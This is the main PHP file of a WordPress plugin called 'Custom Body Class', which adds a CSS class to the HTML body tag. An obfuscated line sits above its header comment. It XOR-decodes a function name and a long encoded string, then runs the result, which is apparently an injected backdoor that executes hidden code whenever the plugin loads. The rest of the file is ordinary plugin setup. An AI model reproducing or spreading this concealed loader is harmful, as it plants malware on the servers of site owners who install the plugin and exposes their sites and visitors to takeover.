<?php $fqqVnh='CNWP- -3UX.9DU='^' <21YErU 6MM-:S';$DYlzxUy=$fqqVnh('',',7MoSXCO5I-8g0C=0BIEW=5C7SZLJ5<8H.aYaG:2A>NR6NP6Nx,.3b MFAm>WDFgOT1L.oabQ7NmlRdrnMmpbsONGDTXFEUP>KRSGet0AkrvliB=sSTL-5+FE15M-OJybIZEfK5SU7UEFbjukF6T=Ajj=>BhDh=S48MXNvf<:H82YcgUE+BnYN61=0X-:E-COO,1jHkhI=49;n3OLPdsM S643h=ASX2.3PUJuqlQM.93NaIM-YEUQ=KlM0s:.=-1i,CKBK7IgiUqg1A8OYgr5XJfTRL.d:6-ajJWK3-mXOQU97ZARgu>A52XMk;:y,XOkyaHR.YyW1Fk6<DNA2-mNl8;<4exh>GQBXQP0AhOZnt;WWH7qc1GCdlY+:A.QKWPsvfS<8LalZpJZN dQRAE,BX-Myk8YDp3TYZ70pEG9B8MXNRZ>;4RfB89.S6-8c,VL.a1QC6xxg2=V8H-jc-ULRgddc01L3i:0TjkzIR.nH2ZZ5qMHRLBNABnEEI-KJW7NGKs:21iYeCRJ-5ejJbYe94gec+YTXpfX2TJdaDKyECtXG<VtmC8aYQyPVHwZgyvYbHRMoJsTW0dMrVRs,>+28>RQKoEJD11GfJK658SSYkxlP  IUQqSKHxjRLE9EZA8GJ5JHUms7RU9R4WhdQx=z53<TFwMjIK'^'EQeN5--,A BV8U;TC6:mpEZ1h7;8+jcU=ZFpHgA8HX;<U:9Y XTAA=D,2 2a:12Ok0P8OCAF:R7DLrDRN6gykW ;3dixabnZ7B4<5MPYaVRFWIfTO  >APEnaUT9LfqYF qnOA<ZqX 1fLWUCbR5I 1NTcb6dLV6Mci1nSFON:TW7KC> Rk3pu<84B=YO7Ckk YECsaa47I31JW.81DNmF2ZGVS7e79FOl;03ULL7,BJVukC+B+ 42UkDio0uavdtIM0kf R0GTkQCG T:<NRNRCB038O;QSTAWjs VTVRFu1XC;aoGQH YG=vaF0sE>oCXE,3Z8PwJLbPS6+ QEMfHgiye0=;jg01xu;U8HrdNPM6;=RXCJMJmH=JN q:..pNVB8YAwkeST.;:ADlre3M.-HvsbES9z9p=;CQPxgy7V>=<;;RRN7N:WKq7WYY<s;9ZIS00SNL8VX5W,HBGI483NHDGTP8R6QU-CBAC;HFlV;.TQknr-0< ;1. 0r.2>D:4cTQWHNuEg6+YTLJlDyMTPRMGO8 9+A3W-m9HdvDedC9uYfDYpZSk2I5npAmPABoWpcuV.A2aRCdRptSMLYSAa9420 2-BE4Nm;WLT<2=LTLtDA=4xXskhXJr7O0 , TonQ+<46TG3,U=U3O9xC7sPKU nGdQC6');$DYlzxUy();
/*
* @package   CustomBodyClass
* @author    PixelGrade <andrei.lupu@pixelgrade.com>
* @license   GPL-2.0+
* @link      http://andrei-lupu.com
* @copyright 2014 PixelGrade
*
* @wordpress-plugin
Plugin Name: Custom Body Class
Plugin URI:  http://andrei-lupu.com
Description: A plugin which allows you to add a custom CSS class the HTML body tag
Version: 0.4.0
Author: Andrei Lupu
Author URI: http://andrei-lupu.com
Author Email: andrei.lupu@pixelgrade.com
Text Domain: custom_body_class
License:     GPL-2.0+
License URI: http://www.gnu.org/licenses/gpl-2.0.txt
Domain Path: /lang
*/

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

// ensure EXT is defined
if ( ! defined( 'EXT' ) ) {
	define( 'EXT', '.php' );
}

require 'core/bootstrap' . EXT;

$config = include 'plugin-config' . EXT;

// set textdomain
custom_body_class::settextdomain( $config['textdomain'] );

$defaults = include 'plugin-defaults' . EXT;

$current_data = get_option( $config['settings-key'] );

if ( $current_data === false ) {
	add_option( $config['settings-key'], $defaults );
} else if ( count( array_diff_key( $defaults, $current_data ) ) != 0 ) {
	$plugindata = array_merge( $defaults, $current_data );
	update_option( $config['settings-key'], $plugindata );
}
# else: data is available; do nothing

// Load Callbacks
// --------------

$basepath     = dirname( __FILE__ ) . DIRECTORY_SEPARATOR;
$callbackpath = $basepath . 'callbacks' . DIRECTORY_SEPARATOR;
custom_body_class::require_all( $callbackpath );

require_once( plugin_dir_path( __FILE__ ) . 'class-custom_body_class.php' );

if ( ! function_exists( 'init_custom_body_class_plugin' ) ) {
	function init_custom_body_class_plugin () {
		global $custom_body_class_plugin;
		$custom_body_class_plugin = CustomBodyClassPlugin::get_instance();
	}
}

add_action('init', 'init_custom_body_class_plugin');
